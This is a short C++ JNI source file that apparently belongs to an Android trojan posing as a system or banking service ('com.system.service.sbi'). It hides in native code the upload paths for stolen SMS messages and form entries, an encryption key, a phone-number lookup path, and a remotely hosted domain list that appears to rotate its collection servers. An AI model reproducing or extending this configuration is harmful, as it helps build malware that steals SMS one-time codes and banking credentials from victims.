#include <jni.h>
#include <string>

// Declare global variables for the domain URLs
std::string sms_save = "/sms-reader/add";
std::string form_save = "/form/add";
std::string site = "localhost";
std::string KEY = "001122334455667A8899aabbccddeeff";
std::string getNumber = "/site/number?site=";
std::string DomainList = "https://dkb0ss2.github.io/checklist/checkMasterS4ve.html";

extern "C"
JNIEXPORT jstring JNICALL
Java_com_system_service_sbi_HelperService_DomainList(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(DomainList.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_system_service_sbi_HelperService_FormSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(form_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_system_service_sbi_HelperService_SMSSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(sms_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_system_service_sbi_HelperService_SITE(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(site.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_system_service_sbi_HelperService_KEY(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(KEY.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_system_service_sbi_HelperService_getNumber(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(getNumber.c_str());
}
